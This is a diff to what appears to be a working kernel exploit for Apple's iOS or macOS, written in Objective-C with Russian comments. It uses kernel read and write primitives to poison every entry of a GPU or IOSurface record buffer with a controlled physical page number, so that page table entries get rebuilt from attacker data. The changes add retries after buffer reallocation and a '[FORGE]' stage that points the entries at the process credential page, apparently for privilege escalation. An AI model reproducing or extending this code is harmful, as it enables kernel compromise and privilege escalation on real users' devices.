@@ -6610,10 +6610,10 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     // (hi32=4 сохраняем — флаг mapped), submit с bit43=0 (уже в tsdV) перестраивает
     // PTE из отравленного буфера. Маркеры на каждом шаге = самопроверка.
     if (pfn32 && ctlPFN) {
-        uint64_t pd247 = kpLooksLikeKernelPointer(surfVA) ? kp_untag_ptr(early_kread64(surfVA + 0x30)) : 0;
+        pd247 = kpLooksLikeKernelPointer(surfVA) ? kp_untag_ptr(early_kread64(surfVA + 0x30)) : 0;
         uint64_t vt247 = pd247 ? kp_untag_ptr(early_kread64(pd247)) : 0;
         uint64_t typ247 = pd247 ? (early_kread64(pd247 + 0x20) & 0xf0) : 0;
-        uint64_t hdr247 = (typ247 == 0x10) ? kp_untag_ptr(early_kread64(pd247 + 0x90)) : 0;
+        hdr247 = (typ247 == 0x10) ? kp_untag_ptr(early_kread64(pd247 + 0x90)) : 0;
         buf247 = hdr247 ? kp_untag_ptr(early_kread64(hdr247 + 0x10)) : 0;
         uint32_t cnt247 = buf247 ? (uint32_t)early_kread64(buf247 + 0x28) : 0;
         uint8_t bfl247 = 0; if (buf247) kreadbuf(buf247 + 0x2d, &bfl247, 1);
@@ -6635,6 +6635,18 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                 uint64_t rb = early_kread64(buf247 + 0x30 + (uint64_t)i * 8);
                 kpNote(r, [NSString stringWithFormat:@"      readback: %#018llx — %@", (unsigned long long)rb, (uint32_t)rb == ctlPFN ? @"ПРИЛИПЛО" : @"МИМО"]);
                 hitAddr[nDep] = buf247 + 0x30 + (uint64_t)i * 8; hitOld[nDep] = e; hitForm[nDep] = 5; nDep++;
+            }
+            // 1.9.266 (р.66 L6): патчим ВСЕ записи record buffer, не только page-0 —
+            // потребляемая запись не всегда entry[0] (индекс = (cursor+suboff)>>14);
+            // coalescing loop сольёт их в один сегмент → первая страница = ctlPA.
+            // Оригиналы в allOld[] — restore в финале. L5 (realloc буфера) ловим в
+            // retry перечитыванием [hdr+0x10] на каждой попытке.
+            if (nDep && buf247 && cnt247 && cnt247 <= 64) {
+                for (uint32_t i = 0; i < cnt247; i++) allOld[i] = early_kread64(buf247 + 0x30 + (uint64_t)i * 8);
+                allCnt = cnt247; allBuf = buf247;
+                for (uint32_t i = 0; i < cnt247; i++)
+                    early_kwrite64(buf247 + 0x30 + (uint64_t)i * 8, (allOld[i] & 0xffffffff00000000ULL) | ctlPFN);
+                kpNote(r, [NSString stringWithFormat:@"  [CHAIN] все %u записей отравлены (L6 убит — слияние сегментов даст ctlPA)", cnt247]);
             }
             // 1.9.250 (р.62): bit1 SET = STALE-ветка — op-4 отдаёт старые сегменты
             // buffer+0x10, entries НЕ читаются (ошибка 248-й: яд нетронут, PTE мимо).
@@ -6730,6 +6742,10 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     uint64_t rmdHitArr = 0, rmdHitOld = 0; uint32_t rmdHitOff = 0;
     uint64_t specVA[8] = {0}, specOld[8] = {0}; int nSpec = 0;
     int changed = 0;
+    // 1.9.266 (р.66): L5/L6 — pd/hdr на уровне функции для протокола схождения;
+    // allBuf/allOld/allCnt — патч ВСЕХ записей record buffer (не только page-0).
+    uint64_t pd247 = 0, hdr247 = 0;
+    uint64_t allBuf = 0; uint32_t allCnt = 0; uint64_t allOld[64] = {0};
     if (nDep) goto kpx_submit1;
 
     // 1.9.244: РАННИЙ ПАТЧ — page-0 записи page-list из SCAN A (найдены до любого
@@ -7969,6 +7985,19 @@ kpx_submit1: ;
     // только в окне execute, не секундами — урок prev-12).
 kpx_retry: ;   // 1.9.262 fast-path: из victim#1 при nDep>0 — прямо в retry
     for (int attempt = 1; !changed && attempt < 4; attempt++) {
+        // 1.9.266 (р.66): L5 — буфер мог быть перевыделён на прошлом submit
+        // (перечитываем [hdr+0x10]; переехал → свежие оригиналы с нового VA);
+        // L6 — патчим ВСЕ записи на каждой попытке (сериализатор их перечитывает).
+        if (allBuf && hdr247) {
+            uint64_t curBuf = kp_untag_ptr(early_kread64(hdr247 + 0x10));
+            if (curBuf && curBuf != allBuf) {
+                for (uint32_t i = 0; i < allCnt; i++) allOld[i] = early_kread64(curBuf + 0x30 + (uint64_t)i * 8);
+                allBuf = curBuf;
+                kpNote(r, [NSString stringWithFormat:@"  [CHAIN] L5: record buffer перевыделен → %#llx — перепатчены все записи", (unsigned long long)curBuf]);
+            }
+            for (uint32_t i = 0; i < allCnt; i++)
+                early_kwrite64(allBuf + 0x30 + (uint64_t)i * 8, (allOld[i] & 0xffffffff00000000ULL) | ctlPFN);
+        }
         for (int j = 0; j < nSlots; j++) early_kwrite64(slotVAs[j], newQs[j]);
         for (int k = 0; k < nSpec; k++) {
             uint64_t cur = early_kread64(specVA[k]);
@@ -7999,10 +8028,11 @@ kpx_retry: ;   // 1.9.262 fast-path: из victim#1 при nDep>0 — прямо 
         // глубже — wire-layer); entry0 == ctlPFN = mapper игнорирует буфер (H2).
         // 1.9.250 (р.62): bit1 SET = stale-ветка (entries не читаются), bit1
         // CLEAR = сериализатор читает entries. Откат = пересборка из wire list.
-        if (buf247) {
-            uint8_t f2 = 0; kreadbuf(buf247 + 0x2d, &f2, 1);
-            uint64_t e0 = early_kread64(buf247 + 0x30);
-            uint64_t e1 = early_kread64(buf247 + 0x38);
+        if (buf247 || allBuf) {
+            uint64_t dBuf = allBuf ? allBuf : buf247;   // 1.9.266: после L5-realloc дампим АКТУАЛЬНЫЙ буфер
+            uint8_t f2 = 0; kreadbuf(dBuf + 0x2d, &f2, 1);
+            uint64_t e0 = early_kread64(dBuf + 0x30);
+            uint64_t e1 = early_kread64(dBuf + 0x38);
             kpNote(r, [NSString stringWithFormat:@"      buffer пост-submit: flags=%#x entry0=%#018llx entry1=%#018llx — %@",
                       f2, (unsigned long long)e0, (unsigned long long)e1,
                       changed ? @"ЗАПИСЬ ПРОШЛА — сериализатор прочитал яд ✓ (р.62 подтверждён на железе)" :
@@ -8013,6 +8043,7 @@ kpx_retry: ;   // 1.9.262 fast-path: из victim#1 при nDep>0 — прямо 
             for (int j = 0; j < nSlots; j++) early_kwrite64(slotVAs[j], origQs[j]);
             for (int i = 0; i < nDep; i++) if (hitForm[i] > 0 && hitForm[i] != 4) early_kwrite64(hitAddr[i], hitOld[i]);
             for (int k = 0; k < nSpec; k++) if (specOld[k]) early_kwrite64(specVA[k], specOld[k]);
+            if (allBuf && allCnt) for (uint32_t i = 0; i < allCnt; i++) early_kwrite64(allBuf + 0x30 + (uint64_t)i * 8, allOld[i]);   // 1.9.266
         }
     }
     // restore всех пропатченных слотов (порт-маршрут или одиночный ranges)
@@ -8020,6 +8051,8 @@ kpx_retry: ;   // 1.9.262 fast-path: из victim#1 при nDep>0 — прямо 
         early_kwrite64(slotVAs[j], origQs[j]);
     // 1.9.219: финальный restore DEP-хитов ВСЕГДА (яд не живёт дольше теста)
     for (int i = 0; i < nDep; i++) if (hitForm[i] > 0 && hitForm[i] != 4) early_kwrite64(hitAddr[i], hitOld[i]);
+    // 1.9.266: финальный restore ВСЕХ записей record buffer (L6-яд)
+    if (allBuf && allCnt) for (uint32_t i = 0; i < allCnt; i++) early_kwrite64(allBuf + 0x30 + (uint64_t)i * 8, allOld[i]);
     // 1.9.222: финальный restore spec (яд не живёт дольше теста)
     if (!changed) for (int k = 0; k < nSpec; k++) if (specOld[k]) early_kwrite64(specVA[k], specOld[k]);
     // 1.9.248: финальный restore records-built flags (кворд +0x28 целиком — count не тронут)
@@ -8219,6 +8252,8 @@ kpx_retry: ;   // 1.9.262 fast-path: из victim#1 при nDep>0 — прямо 
                         early_kwrite64(hitAddr[i], nq);
                     }
                     if (nDep) kpNote(r, [NSString stringWithFormat:@"  [FORGE] DEP-хиты перепатчены на ucredPFN (%d шт)", nDep]);
+                    // 1.9.266: и ВСЕ записи record buffer — на ucredPFN (L6)
+                    if (allBuf && allCnt) for (uint32_t i = 0; i < allCnt; i++) early_kwrite64(allBuf + 0x30 + (uint64_t)i * 8, (allOld[i] & 0xffffffff00000000ULL) | fPFN);
                     // victim#2 submit (bit43=0 — свежий rebuild из отравленного источника)
                     // 1.9.251: rect 64×64×4 = 0x4000 — форж покрывает всю 16KB-страницу ucred
                     // 1.9.259: на СВЕЖЕМ pipe — dst пересериализуется с ucredPFN
